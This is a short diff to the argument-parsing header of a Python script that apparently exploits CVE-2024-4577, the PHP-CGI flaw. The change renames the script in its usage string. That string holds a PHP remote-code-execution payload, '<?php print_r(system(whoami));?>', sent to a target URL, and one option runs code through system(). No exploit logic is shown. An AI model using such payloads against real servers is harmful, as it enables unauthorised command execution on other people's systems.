@@ -3,7 +3,7 @@ import argparse
 import warnings
 warnings.filterwarnings("ignore")
 
-parser = argparse.ArgumentParser(usage="python3 main.py -t http://target.com/index.php -c \"<?php print_r(system(whoami));?>\"")
+parser = argparse.ArgumentParser(usage="python3 2024-4577.py -t http://target.com/index.php -c \"<?php print_r(system(whoami));?>\"")
 parser.add_argument('-t', help='target', required=True)
 parser.add_argument('-c', help='to exec code using system()', required=True)
 args = parser.parse_args()
